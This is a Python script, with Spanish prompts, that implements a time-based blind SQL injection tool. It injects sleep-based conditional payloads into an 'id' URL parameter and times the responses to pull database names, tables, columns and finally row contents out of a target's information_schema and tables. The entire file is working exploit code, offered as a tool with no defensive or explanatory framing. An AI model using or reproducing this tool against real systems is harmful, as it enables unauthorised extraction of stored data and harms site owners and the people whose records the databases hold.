#!/usr/bin/env python3

import pwn
import requests
import time

class Sqli():
    def __init__(self,url):
        self.URL = url
        self.string = ""
        self.failed_attempts = 0
        self.ptitle = pwn.log.progress('Iniciando Inyección SQL')
        self.pstring = pwn.log.progress('Datos extraídos')
        self.query_types = {
            'databases': self.database_query,
            'tables': self.tables_query,
            'columns': self.columns_query,
            'data': self.data_query
        }
        self.position = None
        self.char = None

    def database_query(self):
        databases = {
            'id': f"1 and if(ascii(substring((select group_concat(schema_name) from information_schema.schemata),{self.position},1))={self.char},sleep(0.03),1)"
        }

        return databases

    def tables_query(self):
        tables = {
            'id': f"1 and if(ascii(substring((select group_concat(table_name) from information_schema.tables where table_schema=CHAR({self.ascii_db})),{self.position},1))={self.char},sleep(0.03),1)"
        }

        return tables

    def columns_query(self):
        columns = {
            'id': f"1 and if(ascii(substring((select group_concat(column_name) from information_schema.columns where table_schema=CHAR({self.ascii_db}) and table_name=CHAR({self.ascii_table})),{self.position},1))={self.char},sleep(0.03),1)"
        }

        return columns

    def data_query(self):
        data = {
            'id': f"1 and if(ascii(substring((select group_concat({self.columns}) from {self.database}.{self.table}),{self.position},1))={self.char},sleep(0.03),1)"
        }

        return data

    def makeSQLI(self,to_be_scanned):

        for self.position in range(1,1000):
            for self.char in range(32,128):
                query = self.query_types[to_be_scanned]()

                before = time.time()
                r = requests.get(url=self.URL,params=query)
                after = time.time()

                if (after-before) > 0.03:
                    self.string += chr(self.char)
                    self.pstring.status(self.string)
                    self.failed_attempts = 0
                    break
                else:
                    self.failed_attempts += 1

                if self.failed_attempts == 400:
                    return

    def ask_database(self):
        databases_list = self.databases.split(',')
        databases = {}

        for n,database in enumerate(databases_list):
            databases[n+1]= database
            print(f'  [{n+1}] --> {database}')

        database = int(input('\n[?] Elige una base de datos: '))

        if database in databases.keys():
            self.ascii_db = ','.join(str(ord(n)) for n in databases[database])
            self.database = databases[database]

    def ask_table(self):
        tables_list = self.tables.split(',')
        tables = {}

        for n,table in enumerate(tables_list):
            tables[n+1]= table
            print(f'  [{n+1}] --> {table}')

        table = int(input('\n[?] Elige una tabla: '))

        if table in tables.keys():
            self.ascii_table = ','.join(str(ord(n)) for n in tables[table])
            self.table = tables[table]

    def ask_columns(self):
        columns_list = self.columns.split(',')
        columns = {}

        for n,column in enumerate(columns_list):
            columns[n+1]= column
            print(f'  [{n+1}] --> {column}')

        n += 2
        print(f'  [{n}] --> Todas las columnas')

        column = int(input('\n[?] Elige columnas: '))

        if column in columns.keys():
            self.columns = columns[column]
        elif column == n:
            self.columns = ',0x3a,'.join(field for field in columns.values())

    def show_data(self):
        for n,data in enumerate(self.string.split(',')):
            print(f'  [{n+1}] --> {data}')

        print()

    def run(self):
        self.makeSQLI('databases')
        print(f'\n[*] Databases encontradas: {self.string}')
        self.databases = self.string
        self.string = ""
        self.ask_database()

        self.makeSQLI('tables')
        print('\n---------------------------------------------------------------------------------------')

        print(f'\n[*] Tablas encontradas: {self.string}')
        self.tables = self.string
        self.string = ""
        self.ask_table()

        self.makeSQLI('columns')
        print('\n---------------------------------------------------------------------------------------')

        print(f'\n[*] Columnas encontradas: {self.string}')
        self.columns = self.string
        self.string = ""
        self.ask_columns()

        self.makeSQLI('data')
        print('\n---------------------------------------------------------------------------------------')
        print(f'\n[*] Datos encontrados: {self.string}')
        self.show_data()
        self.string = ""
